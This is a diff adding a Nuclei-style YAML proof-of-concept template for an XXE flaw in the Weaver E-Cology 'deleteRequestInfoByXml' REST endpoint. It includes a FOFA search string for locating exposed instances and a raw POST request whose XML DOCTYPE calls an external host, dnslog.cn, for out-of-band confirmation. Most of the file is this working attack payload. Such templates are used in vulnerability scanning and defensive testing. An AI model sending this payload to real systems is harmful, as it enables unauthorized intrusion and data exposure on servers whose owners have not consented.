@@ -1,0 +1,32 @@
+id: poc-qggl4q97s5sq7vgt
+info:
+  name: 泛微E-Cology系统deleteRequestInfoByXml存在XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qggl4q97s5sq7vgt'
+  tags: xxe,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qggl4q97s5sq7vgt
+    fofa: app="泛微-协同商务系统"
+http:
+- raw:
+  - 'POST /rest/ofs/deleteRequestInfoByXml HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/xml
+
+    Content-Length: 131
+
+
+    <?xml version="1.0" encoding="utf-8"?>
+
+    <!DOCTYPE syscode SYSTEM "http://dnslog.cn/aa">
+
+    <M><syscode>&send;</syscode></M>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
